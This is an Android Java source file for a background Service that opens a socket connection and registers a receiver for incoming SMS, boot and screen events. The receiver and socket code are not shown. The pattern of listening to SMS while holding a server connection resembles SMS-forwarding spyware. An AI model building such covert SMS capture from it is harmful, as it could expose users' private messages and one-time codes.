package gsmattglobal.smsmessage;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

import gsmattglobal.smsmessage.socket.SocketManager;

public class MyService extends Service {

    BroadcastReceiver myReceiver;

    @Override
    public void onCreate() {
        super.onCreate();

        SocketManager.getInstance().connect();
        myReceiver = new SMSReceiver();
        IntentFilter intentFilter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        intentFilter.addAction(Intent.ACTION_SCREEN_OFF);
        intentFilter.addAction(Intent.ACTION_BOOT_COMPLETED);
        intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");

        registerReceiver(myReceiver, intentFilter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

//        if (intent == null) {
//            IntentFilter intentFilter = new IntentFilter(Intent.ACTION_SCREEN_ON);
//            intentFilter.addAction(Intent.ACTION_SCREEN_OFF);
//            intentFilter.addAction(Intent.ACTION_BOOT_COMPLETED);
//            intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
//            myReceiver = new SMSReceiver();
//            registerReceiver(myReceiver, intentFilter);
//        }
//        return START_STICKY;
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(myReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
